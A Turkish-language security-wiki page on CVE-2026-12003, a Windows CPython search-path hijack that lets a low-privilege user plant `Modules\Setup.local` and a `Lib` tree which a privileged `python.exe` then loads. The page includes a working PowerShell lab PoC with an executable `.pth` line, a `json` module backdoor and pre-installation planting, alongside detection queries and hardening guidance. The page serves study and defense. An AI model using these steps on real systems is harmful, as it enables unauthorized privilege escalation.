# Windows CPython Build-Landmark ve `sys.path` Hijacking

{{#include ../../../banners/hacktricks-training.md}}

Bir runtime, yalnızca build tree için amaçlanmış relative path'leri koruyabilir. Privileged bir runtime bu path'lerden birini low-privilege tarafından yazılabilir bir directory'ye çözümlerse, attacker beklenen **build landmark**'ı yerleştirebilir ve runtime'ı alternatif bir library prefix'ine güvenmeye zorlayabilir. CVE-2026-12003 bir Windows CPython örneğidir: yerleştirilen `Modules\Setup.local`, protected Python installation'ı değiştirmeden standard-library entry'sini `sys.path` içinde yeniden yönlendirebilir.<sup>[[1]](#references)[[2]](#references)</sup>

## CPython path-construction chain

Etkilenen Windows build'leri `VPATH=..\..` ile derlenmiş ve bunu `sys._vpath` olarak dışa açmıştır. `Modules/getpath.py` içindeki vulnerable fallback, `VPATH\Modules\Setup.local` path'ini interpreter'ın bir source tree'den çalıştığına dair kanıt olarak ele almıştır; aşağıdaki data flow, build-time değerini runtime search-path primitive'ine dönüştürür.<sup>[[1]](#references)[[2]](#references)</sup>

| Aşama | `C:\Program Files\Python314\python.exe` için türetilen değer |
| --- | --- |
| Derlenmiş build path'i | `VPATH=..\..` |
| Runtime build landmark'ı | `C:\Program Files\Python314\..\..\Modules\Setup.local` |
| Attacker tarafından oluşturulan landmark | `C:\Modules\Setup.local` |
| Seçilen `build_prefix` | `C:\` |
| Seçilen standard library | `C:\Lib` |
| Sonuç | Attacker-controlled `C:\Lib`, `sys.path`'e append edilir |

Bu check, executable'ın yanında bulunan daha specific `pybuilddir.txt` dosyası yoksa veya okunamıyorsa kullanılan bir fallback'tir. Bu önemlidir; çünkü low-privilege bir user `C:\Program Files\Python314` üzerinde değişiklik yapamayabilir, ancak yine de `C:\` altında yeni directory'ler oluşturabilir. Daha sonra çalışan privileged `python.exe` process'i, kendi access token'ını kullanarak Python code yükler.<sup>[[1]](#references)[[2]](#references)</sup>

### Preconditions

Bunu yalnızca aşağıdaki koşulların tümü sağlandığında bir privilege boundary olarak değerlendirin:<sup>[[1]](#references)[[2]](#references)</sup>

- Hedef, etkilenen bir **Windows CPython** build'idir; vulnerable path logic'i Python language'a özgü bir özellik değildir.
- `python.exe` dosyasını içeren directory'den `..\..` çözümlenerek elde edilen directory, daha düşük privilege'lı bir user'ın landmark'ı ve `Lib` tree'yi oluşturmasına izin verir.
- Daha yüksek privilege'lı bir user, service, installer veya software-deployment account daha sonra bu interpreter'ı başlatır.
- Hiçbir path-isolation configuration, vulnerable discovery path'ini override etmez.

## Enumeration

Hem derlenmiş değeri hem de effective search path'i inceleyin. Açığa çıkan `..\..` değeri faydalı bir ipucudur, ancak exploitability kanıtı değildir: ayrıca path'i resolve edin, ACL'leri test edin ve yerleştirilen bir landmark'ın protected installation'ın dışında olacağını doğrulayın.<sup>[[1]](#references)[[2]](#references)</sup>
```powershell
python -c "import os,sys; print(sys.executable); print(getattr(sys,'_vpath',None)); print(*sys.path, sep='\n')"

$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$prefix = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
$prefix
icacls $prefix
```
Değerlendirmeyi resmi kurulum programlarıyla sınırlamayın. `python.exe` içeren her ürün için `sys._vpath` değerini gerçek çalıştırılabilir dosya dizinine göre çözümleyin ve sonuçta elde edilen `Modules` ile `Lib` konumlarındaki ACL'leri inceleyin. Daha derin bir kurulum yolu, `C:\` yerine farklı bir yazılabilir uygulama veya vendor dizinine çözümlenebilir.<sup>[[1]](#references)</sup>

## Laboratuvar exploit süreci

Aşağıdaki lab PoC'si, Python'ın başlatılabilmesi için seçilen prefix'in altında meşru runtime'ın yeterli bir kopyasını oluşturur, çalıştırılabilir bir `.pth` satırı ekler ve son olarak landmark'ı oluşturur. Yorumlayıcının geçici olarak eksik bir library tree'yi göstermesini önlemek için payload'ı landmark'tan önce oluşturun.<sup>[[1]](#references)</sup>
```powershell
$pythonDir = python -c "import os,sys; print(os.path.dirname(sys.executable))"
$root = [IO.Path]::GetFullPath((Join-Path $pythonDir '..\..'))
robocopy /E "$pythonDir\Lib" "$root\Lib" | Out-Null
robocopy /E "$pythonDir\DLLs" "$root\Lib" | Out-Null
New-Item "$root\Lib\site-packages" -ItemType Directory -Force | Out-Null
'import subprocess;subprocess.run(["cmd.exe","/c","whoami > %TEMP%\\py-landmark.txt"],shell=False)' |
Set-Content "$root\Lib\site-packages\audit.pth" -Encoding Ascii
New-Item "$root\Modules" -ItemType Directory -Force | Out-Null
New-Item "$root\Modules\Setup.local" -ItemType File -Force | Out-Null
```
Normal site başlatma işlemi sırasında Python, tanınan site-packages dizinlerindeki `.pth` dosyalarını işler. Yalnızca `import` ile başlayıp ardından whitespace gelen satırlar yürütülür ve yürütülebilir ifade tek bir fiziksel satırda kalmalıdır; `python -S`, otomatik `site` import işlemini engeller ve dolayısıyla bu tetikleyiciyi devre dışı bırakır.<sup>[[1]](#references)[[4]](#references)</sup>

### Import ile tetiklenen alternatif

Başlangıç sırasında yürütme zorunlu değildir. Meşru library tree'yi yeniden oluşturduktan sonra, ayrıcalıklı bir script'in öngörülebilir şekilde import ettiği bir module backdoor ekleyin. Örneğin, yerleştirilen `Lib\json\__init__.py` dosyasına code eklemek, victim `json` import ettiğinde yürütülür; güvenilir ancak evrensel olarak import edilmeyen bir module seçmek trigger'ı daha az gürültülü hâle getirebilir.<sup>[[1]](#references)</sup>
```powershell
'open(r"C:\Windows\Temp\json-import-token.txt","w").write(__import__("subprocess").check_output(["whoami"]).decode())' |
Add-Content "$root\Lib\json\__init__.py" -Encoding Ascii
```
Bu varyant yine importing process token’ını devralır, ancak değiştirilmiş module’ün target application tarafından import edilmesine bağlıdır. Gerçek software’leri test ederken original module davranışını koruyun; aksi takdirde import, amaçlanan privileged workflow tamamlanmadan önce başarısız olabilir.<sup>[[1]](#references)</sup>

## Pre-installation planting

Search-path planting, installation işleminden önce gerçekleştirilebilir. Low-privilege bir user, gelecekte kullanılacak `Lib` ağacını ve `Modules\Setup.local` dosyasını hazırlayabilir; ardından privileged bir software portalının, help-desk workflow’unun veya deployment sisteminin all-users installation gerçekleştirmesini bekleyebilir. Yeni interpreter’ı package’ları kurmak veya standard library’yi precompile etmek için başlatan installer’lar, administrator’ın Python’ı manuel olarak açmasına gerek kalmadan payload’u deployment account altında tetikleyebilir.<sup>[[1]](#references)</sup>

Bu durum deployment review sürecini de değiştirir: deployment sonrasında yalnızca final installation directory’yi kontrol etmek yerine, bundled runtime’ı install veya upgrade etmeden **önce** writable ancestor’ları ve önceden mevcut landmark/library directory’lerini inceleyin.<sup>[[1]](#references)</sup>

## Detection and hardening

Useful host pivot’leri; beklenmeyen landmark ve library tree’si, ardından da privileged bir Python launch işlemidir. `Modules\Setup.local`, root-level veya başka şekilde out-of-place `Lib\site-packages\*.pth` dosyalarını, kopyalanmış standard-library package’larını ve owner’ı veya creation time’ı protected installation’dan farklı olan module dosyalarını araştırın. Bunların bir standard user tarafından oluşturulmasını; elevated `python.exe` işleminin `cmd.exe`, `powershell.exe`, account-management tool’larını veya diğer unusual child process’leri spawn etmesiyle ilişkilendirin.<sup>[[1]](#references)</sup>
```powershell
Get-Item C:\Modules\Setup.local -ErrorAction SilentlyContinue | Format-List FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib\site-packages -Filter *.pth -ErrorAction SilentlyContinue |
Select-Object FullName,CreationTime,LastWriteTime
Get-ChildItem C:\Lib -Recurse -File -ErrorAction SilentlyContinue |
Get-Acl | Where-Object Owner -notmatch 'TrustedInstaller|Administrators|SYSTEM'
```
Upstream fix, `VPATH\Modules\Setup.local` fallback'ini kaldırır ve `pybuilddir.txt` dosyasını build tree'nin tek göstergesi haline getirir. Sabit bir build'i veya güncel Python install manager ile yönetilen kullanıcı başına bir kurulumu tercih edin. Yükseltmenin geçici olarak mümkün olmadığı durumlarda, çözümlenen üst dizini koruyun ve `Modules` dizinini kısıtlayıcı ACL'lerle önceden oluşturun; kontrollü `._pth` dosyaları veya `PYTHONHOME` da discovery sürecini değiştirebilir, ancak uygulama uyumluluğu testi gerektirir.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [Bishop Fox - CVE-2026-12003: Windows CPython Search-Path Hijacking ve Local Privilege Escalation](https://bishopfox.com/blog/python-software-foundation-python-3-11-0a3-to-3-15-0b2)
- [2] [CPython issue #151544 - In-tree search paths, install directory değiştirilmeden etkinleştirilebilir](https://github.com/python/cpython/issues/151544)
- [3] [CPython pull request #151545 - `VPATH/Modules/Setup.local` fallback'ini kaldırma](https://github.com/python/cpython/pull/151545)
- [4] [Python documentation - `site` path configuration files](https://docs.python.org/3/library/site.html)
{{#include ../../../banners/hacktricks-training.md}}
